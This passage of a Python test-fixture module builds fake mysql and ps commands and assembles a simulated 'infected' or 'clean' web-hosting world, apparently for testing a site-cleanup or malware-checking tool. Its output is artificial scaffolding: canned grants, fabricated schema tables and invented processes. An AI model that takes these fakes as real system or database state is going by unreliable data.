    gr = os.environ.get("CLAUDIA_TEST_GRANTS") or "GRANT USAGE ON *.* TO `wp_user`@`localhost`|GRANT ALL PRIVILEGES ON `dbtest`.* TO `wp_user`@`localhost`"
    print("Grants for wp_user@localhost")
    for g in gr.split("|"):
        print(g)
    sys.exit(0)
if "information_schema" in sql:
    con.execute("ATTACH ':memory:' AS information_schema")
    I = "information_schema."
    con.execute("CREATE TABLE %scolumns (table_schema, table_name, column_name, data_type, character_maximum_length, ordinal_position)" % I)
    con.execute("CREATE TABLE %stables (table_schema, table_name, table_type, engine, table_rows, create_time, update_time, data_length, index_length)" % I)
    con.execute("CREATE TABLE %striggers (trigger_schema, trigger_name, event_object_table, action_timing, event_manipulation, action_statement)" % I)
    con.execute("CREATE TABLE %sevents (event_schema, event_name, status, event_definition)" % I)
    con.execute("CREATE TABLE %sroutines (routine_schema, routine_name, routine_type, routine_definition)" % I)
    for (name,) in con.execute("SELECT name FROM main.sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'").fetchall():
        n = con.execute("SELECT COUNT(*) FROM main.`%s`" % name).fetchone()[0]
        made = os.environ.get("CLAUDIA_TEST_CREATED", "2026-10-20 10:00:00") if name.endswith("_newtbl") else "2024-01-01 00:00:00"
        con.execute("INSERT INTO %stables VALUES ('dbtest', ?, 'BASE TABLE', 'InnoDB', ?, ?, NULL, ?, 0)" % I, (name, n, made, 4096 + n * 100))
        for k, (_cid, cn, ct, _nn, _d, _pk) in enumerate(con.execute("PRAGMA main.table_info(`%s`)" % name).fetchall(), 1):
            isText = "TEXT" in (ct or "").upper() or "CHAR" in (ct or "").upper() or not ct
            con.execute("INSERT INTO %scolumns VALUES ('dbtest', ?, ?, ?, NULL, ?)" % I, (name, cn, "text" if isText else "int", k))
    for (nm, tbl, body) in con.execute("SELECT name, tbl_name, sql FROM main.sqlite_master WHERE type='trigger'").fetchall():
        con.execute("INSERT INTO %striggers VALUES ('dbtest', ?, ?, 'AFTER', 'INSERT', ?)" % I, (nm, tbl, body))
try:
    cur = con.execute(sql)
    rows = cur.fetchall()
    cols = [d[0] for d in cur.description or []]
    con.commit()
except sqlite3.OperationalError as e:
    m = re.search(r"no such table: (\S+)", str(e))
    if m:
        sys.stderr.write("ERROR 1146 (42S02) at line 1: Table 'db.%s' doesn't exist\n" % m.group(1))
    else:
        sys.stderr.write("ERROR 1064 (42000): %s\n" % e)
    sys.exit(1)

def esc(v):
    if v is None:
        return "NULL"
    return str(v).replace("\\", "\\\\").replace("\t", "\\t").replace("\n", "\\n").replace("\0", "\\0")

if rows:
    print("\t".join(cols))
    for r in rows:
        print("\t".join(esc(v) for v in r))
'''


PS_SHIM = """#!/bin/sh
F="$HOME/.fake_ps"
if [ -f "$F" ]; then L=$(cat "$F"); else L=$(printf '100 1 05:00 sshd: u@pts/0\\n200 100 00:10 -bash\\n300 1 00:30 /usr/bin/php-fpm8.2 --daemonize'); fi
case "$*" in
  *"args="*) echo "$L" ;;
  *) echo "$L" | awk '{print $1}' ;;
esac
"""


def install_mysql_shim(bin_dir: str, db_path: str) -> str:
    os.makedirs(bin_dir, exist_ok=True)
    p = os.path.join(bin_dir, "mysql")
    with open(p, "w", encoding="utf-8") as fh:
        fh.write(MYSQL_SHIM)
    os.chmod(p, 0o755)
    # ps-Attrappe: Die Testmaschine hat eigene, fremde Prozesse. Ohne Attrappe würde die Prozess-Prüfung diese bewerten.
    ps = os.path.join(bin_dir, "ps")
    with open(ps, "w", encoding="utf-8") as fh:
        fh.write(PS_SHIM)
    os.chmod(ps, 0o755)
    os.environ["CLAUDIA_TEST_DB"] = db_path
    return bin_dir


def make_world(base: str, infected: bool = True) -> Dict[str, str]:
    """Komplette Testwelt: Home mit Seite, Logs, DB und mysql-Attrappe."""
    home = os.path.join(base, "infected" if infected else "clean", "home")
    os.makedirs(home, exist_ok=True)
    site = build_site(home, infected)
    dbp = os.path.join(base, "infected" if infected else "clean", "test.sqlite")
    build_db(dbp, infected)
    bin_dir = install_mysql_shim(os.path.join(base, "infected" if infected else "clean", "bin"), dbp)
    return {"home": home, "site": site, "site_rel": "html/site", "db": dbp, "bin": bin_dir}


if __name__ == "__main__":
    import sys
    out = sys.argv[1] if len(sys.argv) > 1 else "/tmp/claudia_world"
    print(json.dumps(make_world(out, infected=True), indent=2))
